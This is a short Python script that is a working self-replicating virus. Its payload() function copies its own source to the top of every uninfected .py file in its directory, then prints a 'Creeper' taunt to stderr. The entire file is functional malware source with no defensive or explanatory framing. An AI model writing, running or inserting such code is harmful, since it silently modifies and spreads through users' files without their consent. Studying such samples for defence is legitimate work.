def payload():
    import inspect, pathlib, sys
    virus = '\n'.join((inspect.getsource(payload), 'payload()'))
    for file in pathlib.Path(__file__).absolute().parent.glob('*.py'):
        file_c = file.read_text()
        if 'payload()' not in file_c: file.write_text(virus + '\n' + file_c)
    print("I'M THE CREEPER, CATCH ME IF YOU CAN!", file=sys.stderr)

payload()